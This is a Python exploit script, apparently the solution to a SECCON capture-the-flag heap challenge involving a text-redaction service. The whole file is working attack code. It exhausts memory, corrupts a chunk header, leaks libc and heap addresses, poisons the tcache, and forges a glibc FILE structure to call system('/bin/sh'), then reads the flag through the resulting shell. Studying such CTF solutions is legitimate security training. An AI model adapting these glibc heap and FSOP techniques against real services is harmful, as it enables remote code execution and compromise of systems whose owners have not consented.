from tqdm import tqdm
from ptrlib import *
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", 9999))

def create(index, size, data):
    sock.sendlineafter("> ", 1)
    sock.sendlineafter("Index: ", index)
    sock.sendlineafter("Size: ", size)
    if len(data) == size:
        sock.sendafter("String: ", data)
    else:
        sock.sendlineafter("String: ", data)
def create_4gb(index):
    num = 0x1000
    payload  = b'1\n'
    payload += str(index).encode() + b"\n"
    payload += str(0x10000).encode() + b"\n"
    payload += b"\n"
    for i in range(16):
        if i == 15:
            num = 0xfef
        for _ in tqdm(range(num)):
            sock.send(payload)
        sock.recvonce(len("Index: Size: String: > ") * num)
def blackout(index, word):
    sock.sendlineafter("> ", 2)
    sock.sendlineafter("Index: ", index)
    sock.sendlineafter("Word to redact: ", word)
    sock.recvuntil("[Redacted]\n")
    return sock.recvline()
def delete(index):
    sock.sendlineafter("> ", 3)
    sock.sendlineafter("Index: ", index)

libc = ELF("libc.so.6")

while True:
    #sock = Process("./chall")
    sock = Socket(HOST, PORT)

    # Create victim chunk
    size = 0x10100 - 0x10
    create(0, 0x107, b"A"*0x100) # victim
    size -= 0x110
    create(1, 0x27, b"B"*0x20)
    size -= 0x30
    create(2, 0xf7, b"C"*0xf0) # victim (tcache)
    size -= 0x100
    create(3, 0xf7, b"D"*0xf0)
    size -= 0x100
    create(4, 0x2a07 - 0x110 - 0x30 - 0x100 - 0x100, b"E")
    size -= 0x2a10 - 0x110 - 0x30 - 0x100 - 0x100

    # Fill ~4GB memory
    create_4gb(7)
    create(7, size, b"")

    # Modify size header of letter[0]
    create(7, 0x17, b"?"*8 + b"?F")
    blackout(7, b"F")

    # Create fake large chunk
    delete(0)

    # Leak libc
    create(0, 0x107, b"A"*0x100)
    libc.base = u64(blackout(1, b"dummy")) - libc.main_arena() - 0x60

    # Leak heap
    create(7, 0x47, b"A"*0x28 + p64(0x101))
    delete(7)
    heap_base = u64(blackout(1, b"dummy")) << 12
    logger.info("heap = " + hex(heap_base))
    if heap_base < 0x405000:
        logger.warning("Bad luck!")
        sock.close()
        continue

    break

# Poison tcache
link = (heap_base >> 12) ^ libc.symbol("_IO_2_1_stderr_")
delete(3)
delete(2)
create(7, 0x47, b"A"*0x28 + p64(0x101) + p64(link))

# FSOP
# _IO_wdata + 0x18 == 0
# _IO_wdata + 0x30 == 0
# [_IO_wdata + 0xe0] + 0x68 == system
fake_file = flat([
    0x3b01010101010101, u64(b"/bin/sh\0"), # flags / rptr
    0, 0, # rend / rbase
    0, 1, # wbase / wptr
    0, 0, # wend / bbase
    0, 0, # bend / savebase
    0, 0, # backupbase / saveend
    0, 0, # marker / chain
], map=p64)
fake_file += p64(libc.symbol("system")) # __doallocate
fake_file += b'\x00' * (0x88 - len(fake_file))
fake_file += p64(libc.base + 0x21ba60) # _IO_stdfile_2_lock
fake_file += b'\x00' * (0xa0 - len(fake_file))
fake_file += p64(libc.symbol("_IO_2_1_stderr_") - 0x20) # wide_data
fake_file += b'\x00' * (0xc0 - len(fake_file))
fake_file += p64(libc.symbol("_IO_2_1_stderr_") + 8) # mode != 0
fake_file += b'\x00' * (0xd8 - len(fake_file))
fake_file += p64(libc.base + 0x2160c0 + 0x18 - 0x58) # vtable (_IO_wfile_jumps)
fake_file += p64(libc.symbol("_IO_2_1_stderr_") + 0x18) # _wide_data->_wide_vtable
create(7, 0xf7, b"dummy")
create(7, 0xf7, fake_file)

sock.sendline("0")
sock.recvline()

sock.sendline("cat /flag*")
print(sock.recvline())

sock.close()
